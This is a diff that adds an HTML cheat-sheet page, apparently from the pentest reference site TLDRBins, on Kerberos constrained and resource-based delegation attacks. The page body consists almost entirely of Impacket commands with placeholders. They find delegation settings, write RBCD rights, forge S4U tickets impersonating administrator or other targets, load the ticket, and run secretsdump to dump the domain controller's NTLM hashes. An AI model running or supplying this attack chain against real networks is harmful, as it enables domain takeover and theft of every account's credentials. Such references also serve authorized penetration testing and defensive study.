@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Constrained Delegation | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/constrained_delegation/">
+      <span>Constrained Delegation</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@constrained-delegation/">Constrained Delegation</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-driectory/">Active Driectory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@impacket/">Impacket</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@rbcd/">Rbcd</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="find-delegation">Find delegation</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-findDelegation <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;&#39;</span> -dc-ip &lt;DC&gt; -hashes :&lt;HASH&gt; -k
+</span></span></code></pre></div><h3 id="check-forwardable-flag">Check forwardable flag</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-getST -spn &lt;SERVICE&gt;/&lt;DC&gt; -impersonate administrator <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;&#39;</span> -hashes :&lt;HASH&gt; -self
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check flags</span>
+</span></span><span class="line"><span class="cl">describeTicket.py &lt;TICKET_1&gt;.ccache
+</span></span></code></pre></div><h3 id="rbcd">RBCD</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add delegation</span>
+</span></span><span class="line"><span class="cl">impacket-rbcd <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;&#39;</span> -hashes :&lt;HASH&gt; -k -delegate-from &lt;USERNAME&gt; -delegate-to &lt;TARGET_1&gt; -action write -dc-ip &lt;DC&gt; -use-ldaps
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
+</span></span><span class="line"><span class="cl">impacket-findDelegation <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;&#39;</span> -dc-ip &lt;DC&gt; -hashes :&lt;HASH&gt; -k
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Impersonate</span>
+</span></span><span class="line"><span class="cl">impacket-getST <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;&#39;</span> -spn &lt;SERVICE&gt;/&lt;DC&gt; -impersonate &lt;TARGET_2&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check forwardable flag</span>
+</span></span><span class="line"><span class="cl">describeTicket.py &lt;TICKET_2&gt;.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-getST -spn &lt;SERVICE&gt;/&lt;DC&gt; -impersonate &lt;TARGET_2&gt; <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;TARGET_1&gt;&#39;</span> -hashes :&lt;HASH&gt; -additional-ticket &lt;TICKET_2&gt;.ccache
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Import ticket</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="s1">&#39;&lt;TICKET_2&gt;.ccache&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -no-pass -k &lt;DC&gt; -just-dc-ntlm
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
